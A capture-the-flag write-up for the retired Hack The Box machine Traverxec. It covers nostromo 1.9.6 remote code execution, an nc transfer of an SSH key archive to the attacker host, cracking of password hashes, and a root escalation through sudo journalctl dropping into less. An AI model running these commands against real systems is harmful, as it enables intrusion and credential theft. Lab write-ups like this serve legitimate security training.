# Traverxec

This is the write-up for the box Traverxec that got retired at the 11th April 2020.
My IP address was 10.10.14.6 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.165    traverxec.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/traverxec.nmap 10.10.10.165
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web page is a custom-developed website and there is nothing interesting in the HTML source code.
When looking at the _HTTP Server header_, it shows that the web server runs **nostromo 1.9.6**.

The software [nostromo](https://www.nazgul.ch/dev_nostromo.html) is also known as **nhttpd** and is a web server.

Searching for vulnerabilities for **nostromo**:
```
searchsploit nostromo
```
```
Nostromo - Directory Traversal Remote Command Execution (Metasploit)
nostromo 1.9.6 - Remote Code Execution
```

There is a known Remote Code Execution vulnerability that can be exploited with a **Python script** or with a **Metasploit module**.

Using the Metasploit module:
```
msf6 > use exploit/multi/http/nostromo_code_exec

msf6 exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
msf6 exploit(multi/http/nostromo_code_exec) > set LHOST tun0

msf6 exploit(multi/http/nostromo_code_exec) > exploit
```

Using the Python script:
```
python2 47837.py 10.10.10.165 80 id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Both result in command execution as the user _www-data_, but as the Metasploit module starts a shell immediately, it is more comfortable to use that.

## Privilege Escalation

To get an attack surface on the box, it is recommended to run any **Linux Enumeration script**:
```
wget http://10.10.14.6/LinEnum.sh

bash LinEnum.sh
```

In the web directory is a hidden file _/var/nostromo/conf/.htpasswd_ with a password hash for the user _david_:
```
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

It starts with _"$1$"_ and the [example hashes of Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) show that it is probably **md5crypt**.
Lets try to crack it with **Hashcat**:
```
hashcat -m 500 david_htpasswd.hash /usr/share/wordlists/rockyou.txt
```

After a while it gets cracked and the password is:
> Nowonly4me

Unfortunately the password does not work on SSH or switching users to _david_.

The configuration file _/var/nostromo/conf/nhttpd.conf_ shows that there is a home directory set:
```
(...)
HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

Even though, the user _www-data_ cannot list the contents of the home directory of _/home/david_, it is possible to get into the _public_www_ folder anyway as the web user needs read access there:
```
cd /home/david/public_www

ls -l

total 8
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```

The directory _protected-file-area_ contains a file called _backup-ssh-identity-files.tgz_.
Downloading the file to our local client:
```
# Local client
nc -lvnp 9001 > backup-ssh-identity-files.tgz
```
```
www-data@traverxec:/home/david/public_www/protected-file-area& nc 10.10.14.6 9001 < backup-ssh-identity-files.tgz
```

The file can be decompressed with `tar`:
```
tar -xzvf backup-ssh-identity-files.tar
```

It extracted the public and private SSH keys from _david_:
```
- home/david/.ssh/authorized_keys
- home/david/.ssh/id_rsa
- home/david/.ssh/id_rsa.pub
```

The private key _id_rsa_ is encrypted, but the password found earlier does not work.
Lets try to crack the SSH key with **JohnTheRipper**:
```
sshng2john id_rsa > david_ssh.hash

john --wordlist=/usr/share/wordlists/rockyou.txt david_ssh.hash
```

It gets cracked and the password is:
> hunter

Login as _david_ via SSH:
```
ssh -i home/david/.ssh/id_rsa david@10.10.10.165
```

### Privilege Escalation to root

In the home directory of _david_ is a bash script called _/home/david/bin/server-stats.sh_ where the last line of the script uses `journalctl` with sudo permissions:
```
(...)
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

The binary `journalctl` is listed in [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/) and can be abused to elevate privileges when running it with sudo.
By removing the command after the pipe, `journalctl` will invoke the default pager as `less`.

The command `less` waits for user input and it is possible to execute commands with the exclamation mark character:
```
(...)
!/bin/sh
```

> NOTE: If `journalctl` will not use `less` as the pager, then shrink the terminal size to less than 5 lines and run the command again and it will use `less` by default

This starts a shell as root!
